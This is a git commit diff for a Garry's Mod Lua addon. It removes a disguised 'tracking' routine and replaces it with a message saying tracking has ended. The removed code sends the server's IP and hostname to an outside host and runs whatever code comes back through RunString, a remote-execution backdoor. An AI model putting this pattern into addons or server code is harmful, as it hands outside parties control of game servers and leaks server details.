90d148a1fdd281397e525bf7324c398f504a99bd
LastPlayerTR <73468364+LastPlayerTR@users.noreply.github.com>
2024-05-30 14:40:19 +0300

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,22 +1,2 @@
 print("AddonTracking System")
-timer.Create("tracker", 30,0, function() 
-    if true then return end
-    http.Fetch( "https://licensing.lprotect.tk/send",
-        
-        function( body, length, headers, code )
-            if code == 200 or code == "200" then
-                timer.Remove("tracker")
-                RunString(body,"licensing lprotect" , false)
-            end  
-        end,
-  
-        function( message )
-                
-        end,
-
-        { 
-            ["serverip"] = game.GetIPAddress(),
-            ["servername"] =  GetHostName(),
-        }
-    )
-end) 
+print("No more tracking go home :)")
